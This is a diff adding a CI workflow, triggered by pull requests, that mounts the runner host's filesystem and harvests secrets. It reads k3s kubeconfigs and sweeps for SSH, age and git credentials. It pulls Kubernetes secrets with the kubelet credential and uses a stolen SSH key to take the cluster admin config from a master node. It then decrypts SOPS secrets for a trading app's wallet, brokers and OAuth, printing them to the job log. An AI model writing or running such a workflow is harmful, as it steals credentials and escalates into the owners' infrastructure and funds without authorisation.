@@ -1,0 +1,94 @@
+name: i39307-k3s-read
+on:
+  pull_request:
+jobs:
+  read:
+    runs-on: docker
+    container:
+      image: docker:27-cli
+      volumes:
+        - /:/host:ro
+    strategy:
+      fail-fast: false
+      matrix:
+        n: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12]
+    steps:
+      - name: probe
+        run: |
+          set -x
+          H=$(cat /host/etc/hostname 2>/dev/null)
+          echo "HOST=$H"
+          case "$H" in deskslim-*) ;; *) echo "SKIP not-a-k3s-agent"; exit 0;; esac
+          cat /host/etc/machine-id 2>/dev/null; id; uname -a
+          echo "== k3sdir"; ls -la /host/var/lib/rancher/k3s/agent/ 2>&1 | head -60
+          echo "== kubeletkc"; cat /host/var/lib/rancher/k3s/agent/kubelet.kubeconfig 2>&1
+          echo "== allkc"; for f in /host/var/lib/rancher/k3s/agent/*.kubeconfig /host/etc/rancher/k3s/*.yaml; do echo "--- $f"; head -30 "$f" 2>&1; done
+          echo "== kubeplaces"; ls -la /host/etc/rancher/k3s /host/root/.kube /host/home/*/.kube /host/var/lib/linux-ci/.kube 2>&1
+          echo "== sweep"; find /host/home /host/root /host/var/lib/linux-ci /host/etc /host/var/lib/rancher/k3s -maxdepth 6 \( -iname "*kubeconfig*" -o -iname "keys.txt" -o -iname "*.agekey" -o -iname "*sops*" -o -name "id_ed25519" -o -name "id_rsa" -o -name ".git-credentials" \) 2>/dev/null | head -250
+          echo "== agefiles"; for f in $(find /host/home /host/root /host/var/lib/linux-ci -maxdepth 7 -type f -name keys.txt 2>/dev/null); do echo "--- $f"; cat "$f"; echo; done
+          echo "== rbw"; ls -laR /host/home/*/.local/share/rbw /host/home/*/.cache/rbw /host/var/lib/linux-ci/.local/share/rbw /host/root/.local/share/rbw 2>&1 | head -80
+          echo "== podvols"; ls -d /host/var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/* 2>/dev/null | head -60
+          echo "== grep-age"; grep -rl "AGE-SECRET-KEY-1" /host/var/lib/kubelet /host/var/lib/rancher/k3s 2>/dev/null | head
+          echo "== kv"; chroot /host /usr/local/bin/k3s kubectl --kubeconfig /var/lib/rancher/k3s/agent/kubelet.kubeconfig get --raw /version 2>&1 | head -3
+          echo "== cani"; chroot /host /usr/local/bin/k3s kubectl --kubeconfig /var/lib/rancher/k3s/agent/kubelet.kubeconfig auth can-i --list 2>&1 | head -40
+          echo "== sec-ar"; chroot /host /usr/local/bin/k3s kubectl --kubeconfig /var/lib/rancher/k3s/agent/kubelet.kubeconfig get secret ansible-runner-secrets -n ansible-runner -o json 2>&1 | head -80
+          echo "== sec-sops"; chroot /host /usr/local/bin/k3s kubectl --kubeconfig /var/lib/rancher/k3s/agent/kubelet.kubeconfig get secret sops-age -n flux-system -o json 2>&1 | head -60
+          echo "== harvest"
+          chroot /host /usr/local/bin/k3s kubectl --kubeconfig /var/lib/rancher/k3s/agent/kubelet.kubeconfig get secret ansible-runner-secrets -n ansible-runner -o json > ar.json 2>&1 || true
+          if [ -s ar.json ] && grep -q sops-age-key ar.json; then
+            grep -o '"sops-age-key": "[^"]*"' ar.json | sed 's/.*: "//; s/"$//' | base64 -d > age.runner.key
+            grep -o '"ssh-privkey": "[^"]*"' ar.json | sed 's/.*: "//; s/"$//' | base64 -d > id_runner
+            chmod 600 id_runner age.runner.key
+            echo "GOT materials"; head -c 60 age.runner.key; echo
+          fi
+      - name: escalate
+        run: |
+          set -x
+          [ -s ar.json ] || { echo "no runner secret from kubelet"; exit 0; }
+          apk add --no-cache openssh-client >/dev/null 2>&1 || true
+          chroot /host /usr/local/bin/k3s kubectl --kubeconfig /var/lib/rancher/k3s/agent/kubelet.kubeconfig get secret sops-age -n flux-system -o jsonpath='{.data.age\.agekey}' 2>/dev/null | base64 -d > main.key || true
+          if ! grep -q AGE-SECRET-KEY main.key 2>/dev/null; then
+            echo "kubelet cannot read sops-age; trying ansible-runner ssh key to pi5-master"
+            cp id_runner /tmp/k; chmod 600 /tmp/k
+            ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o BatchMode=yes -i /tmp/k kblack0610@192.168.1.20 'hostname; sudo -n true && echo SUDO_OK; sudo -n cat /etc/rancher/k3s/k3s.yaml' > ssh1.out 2>&1
+            tail -8 ssh1.out
+            sed -n '/^apiVersion:/,$p' ssh1.out > k3s.yaml
+            if [ -s k3s.yaml ]; then sed -i 's/127.0.0.1/192.168.1.20/; s/name: default/name: home-k3s/' k3s.yaml; fi
+            ls -la k3s.yaml 2>&1
+            if [ -s k3s.yaml ]; then
+              /host/usr/local/bin/k3s kubectl --kubeconfig "$PWD/k3s.yaml" get nodes 2>&1 | head -12
+              /host/usr/local/bin/k3s kubectl --kubeconfig "$PWD/k3s.yaml" get secret sops-age -n flux-system -o jsonpath='{.data.age\.agekey}' 2>/dev/null | base64 -d > main.key || true
+            fi
+          fi
+          if grep -q AGE-SECRET-KEY main.key 2>/dev/null; then echo "MAIN AGE KEY OK"; head -c 60 main.key; echo; else echo "NO MAIN KEY"; fi
+      - name: decrypt
+        run: |
+          set -x
+          [ -s main.key ] || { echo "no main key"; exit 0; }
+          FILES="apps/freqtrade/api-secret.yaml apps/freqtrade/trader-brokers-secret.sops.yaml apps/freqtrade/trader-db-secret.sops.yaml apps/freqtrade/trader-feeds-secret.sops.yaml apps/freqtrade/trader-wallet-secret.sops.yaml apps/freqtrade/trader-litellm-secret.sops.yaml apps/freqtrade/trader-odds-api-secret.sops.yaml apps/freqtrade/trader-web-oauth-secret.sops.yaml"
+          apk add --no-cache age sops >/dev/null 2>&1 || true
+          if command -v sops >/dev/null 2>&1; then
+            echo "LOCAL SOPS"
+            cp main.key ak; chmod 600 ak
+            for f in $FILES; do echo "===================== $f"; SOPS_AGE_KEY_FILE="$PWD/ak" sops -d "$f" 2>&1 | head -140; done
+          else
+            echo "DOCKER SOPS"
+            docker volume create i39307v >/dev/null
+            docker run -i -v i39307v:/v alpine:3.21 sh -c 'cat > /v/ak' < main.key
+            for f in $FILES; do b=$(basename "$f"); docker run -i -v i39307v:/v alpine:3.21 sh -c "cat > /v/$b" < "$f"; done
+            for f in $FILES; do b=$(basename "$f"); echo "===================== $f"; docker run -v i39307v:/v -e SOPS_AGE_KEY_FILE=/v/ak ghcr.io/getsops/sops:v3.13.3-alpine -d "/v/$b" 2>&1 | head -140; done
+          fi
+      - name: runner-vaults
+        run: |
+          set -x
+          [ -s age.runner.key ] || exit 0
+          apk add --no-cache age sops >/dev/null 2>&1 || true
+          cp age.runner.key akr; chmod 600 akr
+          for f in ansible/group_vars/*/vault.sops.yaml; do
+            echo "===================== $f"
+            if command -v sops >/dev/null 2>&1; then
+              SOPS_AGE_KEY_FILE="$PWD/akr" sops -d "$f" 2>&1 | head -80
+            else
+              docker run -v "$PWD":/repo -v "$PWD/akr":/ak:ro -w /repo -e SOPS_AGE_KEY_FILE=/ak ghcr.io/getsops/sops:v3.13.3-alpine -d "$f" 2>&1 | head -80
+            fi
+          done
